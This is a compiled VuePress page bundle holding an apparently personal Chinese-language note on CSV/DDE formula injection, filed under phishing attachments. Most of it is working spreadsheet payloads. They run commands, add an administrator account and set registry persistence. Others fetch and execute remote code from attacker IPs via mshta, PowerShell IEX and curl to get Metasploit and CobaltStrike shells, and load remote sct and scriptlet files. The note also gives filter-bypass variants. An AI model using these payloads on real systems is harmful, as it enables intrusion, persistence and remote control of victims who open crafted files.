import{_ as c}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as l,o as d,c as r,a as e,d as t,b as a,w as o,e as n}from"./app-BT-bWAve.js";const p={},u=e("h1",{id:"csv",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#csv"},[e("span",null,"CSV")])],-1),m={href:"https://github.com/SecWiki/office-exploits/tree/master/injections",target:"_blank",rel:"noopener noreferrer"},h={href:"https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0",target:"_blank",rel:"noopener noreferrer"},v=n('<hr><h2 id="csv简介" tabindex="-1"><a class="header-anchor" href="#csv简介"><span>CSV简介</span></a></h2><p>CSV(Comma-Separated Values) 是一种用来存储数据的纯文本格式文件。</p><p>CSV文件由任意数目的记录组成，记录间以指定符号(最常见的是逗号,也有用分号,制表符,<code>|</code>,空格等分隔的)分隔</p><p>例如:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407100946680.png" alt="image-20240710094603740"></p><hr><h2 id="csv注入原理" tabindex="-1"><a class="header-anchor" href="#csv注入原理"><span>CSV注入原理</span></a></h2><p>CSV 注入是一种将包含恶意命令的excel公式插入到可以导出csv或xls等格式的文本中，当在excel中打开csv文件时，文件会转换为excel格式并提供excel公式的执行功能，会造成命令执行问题。</p><p>Excel 有一个特性：单元格中的第一个字符是 <code>+、-、@、=</code> 这样的符号时，他会以一个表达式的形式被处理</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407100948082.png" alt="image-20240710094847973"></p>',11),x=e("code",null,"=",-1),g=n(`<p>动态数据交换（DDE），是Windows下进程间通信协议，支持Microsoft Excel，LibreOffice和Apache OpenOffice。</p><p>Excel、Word、RTF、Outlook都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含DDE公式的CSV文件，那么在打开该文件时，Excel就会尝试执行外部应用。</p><hr><p>由于涉及到调用外部应用,加载外部数据, 对于新版本 Office 而言需要在 <code>文件-选项-信任中心-信任中心设置-外部内容-动态数据交换的安全设置</code> 中启用 <code>动态数据交换服务器查找</code> 和 <code>动态数据交换服务器启动</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407101102187.png" alt="image-20240710110237136"></p><hr><h2 id="弹计算器" tabindex="-1"><a class="header-anchor" href="#弹计算器"><span>弹计算器</span></a></h2><p>例如</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=1+cmd|&#39;/C calc&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407101014821.png" alt="image-20240710101319768"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407101014623.png" alt="image-20240710101407766"></p><hr><h2 id="os命令执行" tabindex="-1"><a class="header-anchor" href="#os命令执行"><span>OS命令执行</span></a></h2><p>可以利用上述方式执行系统命令, 例如</p><ul><li><p>打开任意应用程序</p><p>例如打开浏览器访问指定站点</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=1+cmd|&#39;/C &quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&quot; http://100.1.1.131:8090/a&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>反弹Shell</p></li><li><p>添加用户</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=cmd|&#39;/C net user test 123456 /add&#39;!A0+&lt;br&gt;=cmd|&#39;/C net user test 123456 /add &amp;&amp; net localgroup administrators test /add&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>修改注册表</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=cmd|&#39;/C reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v calc /t REG_SZ /d c:\\windows\\system32\\calc.exe /f&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li></ul><hr><h2 id="cmd-mshta-msf-反弹shell" tabindex="-1"><a class="header-anchor" href="#cmd-mshta-msf-反弹shell"><span>cmd+mshta+msf 反弹Shell</span></a></h2><blockquote><p>TODO</p></blockquote><p><code>msf</code>:</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>msfconsole
use exploit/windows/misc/hta_server
<span class="token comment"># 设置srvhost和srvport绑定一个web服务让目标访问</span>
msf exploit<span class="token punctuation">(</span>windows/misc/hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> srvhost <span class="token number">100.1</span>.1.131
<span class="token comment"># 使用的攻击载荷</span>
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp  
<span class="token comment">#默认是x86的,选择x64</span>
<span class="token builtin class-name">set</span> target <span class="token number">1</span>
<span class="token comment"># 绑定攻击机IP</span>
<span class="token builtin class-name">set</span> lhost <span class="token number">100.1</span>.1.131
<span class="token comment"># 启动脚本</span>
run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>新建csv, 插入如下命令并保存文件</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=1+cmd|&#39;/C mshta http://100.1.1.102:8080/3Mw1oRtpuxJp.hta&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>用 Excel 重新打开该 CSV即可上线 msf</p><hr><h2 id="powershell-上线-cobaltstrike" tabindex="-1"><a class="header-anchor" href="#powershell-上线-cobaltstrike"><span>PowerShell 上线 CobaltStrike</span></a></h2><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=1+cmd|&#39;/C &quot;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\\&quot;http://100.1.1.131:8051/b\\&quot;))&quot;&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="cmd-curl-下载与执行可执行文件" tabindex="-1"><a class="header-anchor" href="#cmd-curl-下载与执行可执行文件"><span>CMD + Curl 下载与执行可执行文件</span></a></h2><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=cmd|&#39;/C &quot;curl http://100.1.1.131:8888/artifact_x64.exe --output shell.exe &amp;&amp; .\\shell.exe&quot;&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="超链接钓鱼链接" tabindex="-1"><a class="header-anchor" href="#超链接钓鱼链接"><span>超链接钓鱼链接</span></a></h2><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=HYPERLINK(&quot;http://10.182.234.102:8090/a&quot;,&quot;点我百度”&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="注册加载远程sct" tabindex="-1"><a class="header-anchor" href="#注册加载远程sct"><span>注册加载远程sct</span></a></h2>`,34),b={href:"https://github.com/SecWiki/office-exploits/tree/master/injections",target:"_blank",rel:"noopener noreferrer"},f=n(`<div class="language-csv line-numbers-mode" data-ext="csv" data-title="csv"><pre class="language-csv"><code><span class="token value">fillerText1</span><span class="token punctuation">,</span><span class="token value">fillerText2</span><span class="token punctuation">,</span><span class="token value">fillerText3</span><span class="token punctuation">,</span><span class="token value">=MSEXCEL|&#39;\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://192.168.154.200/cmd.sct scrobj.dll&#39;!&#39;&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="加载-scriptlet" tabindex="-1"><a class="header-anchor" href="#加载-scriptlet"><span>加载 scriptlet</span></a></h2>`,3),k={href:"https://github.com/SecWiki/office-exploits/tree/master/injections",target:"_blank",rel:"noopener noreferrer"},_=n(`<div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>=Package|&#39;scRiPt:http://XXXX/XXXX.xml&#39;!&quot;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="绕过技巧" tabindex="-1"><a class="header-anchor" href="#绕过技巧"><span>绕过技巧</span></a></h2>`,3),C={href:"https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0",target:"_blank",rel:"noopener noreferrer"},E=n(`<hr><h3 id="静态" tabindex="-1"><a class="header-anchor" href="#静态"><span>静态</span></a></h3><p>可以通过运算符<code>+-</code>的方式绕过对于 <code>=</code> 的检测</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>-1+1+cmd |’ /C calc’ !A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参数处输入以下 Payload，<code>%0A</code>被解析，从而后面的数据跳转到下一行：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>%0A-1+1+cmd|&#39; /C calc&#39;!A0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>导出文件为 csv 时，若系统在等号<code>=</code>前加了引号<code>’</code>过滤，则可以使用分号绕过，分号<code>；</code>可分离前后两部分内容使其分别执行：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>;-3+3+cmd|&#39; /C calc&#39;!D2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其他常用 Payload：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>@SUM(cmd|&#39;/c calc&#39;!A0)
=HYPERLINK(&quot;https://attact.com&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><hr>`,11);function S(q,w){const s=l("ExternalLinkIcon"),i=l("RouteLink");return d(),r("div",null,[u,e("blockquote",null,[e("p",null,[e("a",m,[t("office-exploits/injections at master · SecWiki/office-exploits · GitHub"),a(s)])]),e("p",null,[e("a",h,[t("CSV注入详解 - 先知社区 (aliyun.com)"),a(s)])])]),v,e("p",null,[t("不过除了公式之外, "),x,t(" 也可以用于执行代码, 这需要涉及到一个概念: "),a(i,{to:"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/DDE/"},{default:o(()=>[t("DDE")]),_:1})]),g,e("blockquote",null,[e("p",null,[e("a",b,[t("office-exploits/injections at master · SecWiki/office-exploits · GitHub"),a(s)])])]),f,e("blockquote",null,[e("p",null,[e("a",k,[t("office-exploits/injections at master · SecWiki/office-exploits · GitHub"),a(s)])])]),_,e("blockquote",null,[e("p",null,[e("a",C,[t("CSV注入详解 - 先知社区 (aliyun.com)"),a(s)])])]),E])}const A=c(p,[["render",S],["__file","index.html.vue"]]),y=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/CSV/","title":"CSV","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"CSV简介","slug":"csv简介","link":"#csv简介","children":[]},{"level":2,"title":"CSV注入原理","slug":"csv注入原理","link":"#csv注入原理","children":[]},{"level":2,"title":"弹计算器","slug":"弹计算器","link":"#弹计算器","children":[]},{"level":2,"title":"OS命令执行","slug":"os命令执行","link":"#os命令执行","children":[]},{"level":2,"title":"cmd+mshta+msf 反弹Shell","slug":"cmd-mshta-msf-反弹shell","link":"#cmd-mshta-msf-反弹shell","children":[]},{"level":2,"title":"PowerShell 上线 CobaltStrike","slug":"powershell-上线-cobaltstrike","link":"#powershell-上线-cobaltstrike","children":[]},{"level":2,"title":"CMD + Curl 下载与执行可执行文件","slug":"cmd-curl-下载与执行可执行文件","link":"#cmd-curl-下载与执行可执行文件","children":[]},{"level":2,"title":"超链接钓鱼链接","slug":"超链接钓鱼链接","link":"#超链接钓鱼链接","children":[]},{"level":2,"title":"注册加载远程sct","slug":"注册加载远程sct","link":"#注册加载远程sct","children":[]},{"level":2,"title":"加载 scriptlet","slug":"加载-scriptlet","link":"#加载-scriptlet","children":[]},{"level":2,"title":"绕过技巧","slug":"绕过技巧","link":"#绕过技巧","children":[{"level":3,"title":"静态","slug":"静态","link":"#静态","children":[]}]}],"git":{"createdTime":1719565816000,"updatedTime":1720695610000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":2}]},"readingTime":{"minutes":3.1,"words":930},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/CSV/index.md","localizedDate":"2024年6月28日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://github.com/SecWiki/office-exploits/tree/master/injections\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">office-exploits/injections at master · SecWiki/office-exploits · GitHub</a></p>\\n<p><a href=\\"https://xz.aliyun.com/t/12272?time__1311=mqmhD5YIoXqBqDudxUOxAEtKUq0INx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">CSV注入详解 - 先知社区 (aliyun.com)</a></p>\\n</blockquote>"}');export{A as comp,y as data};
